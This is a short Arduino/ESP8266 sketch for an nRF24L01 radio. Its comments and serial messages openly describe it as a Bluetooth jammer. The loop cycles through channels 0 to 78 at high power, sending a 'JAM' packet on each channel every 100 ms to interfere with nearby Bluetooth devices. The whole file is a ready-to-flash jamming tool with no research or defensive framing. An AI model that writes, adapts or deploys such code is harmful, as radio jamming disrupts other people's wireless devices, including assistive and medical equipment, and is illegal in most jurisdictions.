#include <SPI.h>
#include <RF24.h>

// Define the CE and CSN pins for nRF24L01 (based on your connections)
#define CE_PIN 5   // D1 (GPIO5)
#define CSN_PIN 4  // D2 (GPIO4)

// Create RF24 object
RF24 radio(CE_PIN, CSN_PIN);

// Define Bluetooth channels to jam
const int bluetoothChannels[] = {
  0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
  13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23,
  24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34,
  35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45,
  46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56,
  57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67,
  68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78
}; // All Bluetooth channels
const int numBluetoothChannels = sizeof(bluetoothChannels) / sizeof(bluetoothChannels[0]);
int currentChannel = 0;

void setup() {
  Serial.begin(115200);
  radio.begin();
  
  // Set the maximum power level for jamming
  radio.setPALevel(RF24_PA_HIGH);  // High power level for maximum signal strength
  radio.setDataRate(RF24_2MBPS);   // High data rate for better interference
  radio.setCRCLength(RF24_CRC_8);  // Set the CRC length to 8 bits (optional)
  radio.openWritingPipe(0xE8E8F0F0E1LL);  // Set an arbitrary address for transmission
}

void loop() {
  // Set the channel for jamming
  radio.setChannel(bluetoothChannels[currentChannel]);
  
  // Send random noise or data to jam the selected channel
  const char data[] = "JAM"; // You can also use random data if preferred
  radio.write(&data, sizeof(data));  // Transmit "JAM" data
  
  // Print the current channel being jammed for debugging
  Serial.println("Jamming Bluetooth channel " + String(bluetoothChannels[currentChannel]) + "...");
  
  // Cycle through the Bluetooth channels
  currentChannel = (currentChannel + 1) % numBluetoothChannels;  // Increment channel index and wrap around
  
  delay(100);  // Change channel every 100 ms for effective jamming
}
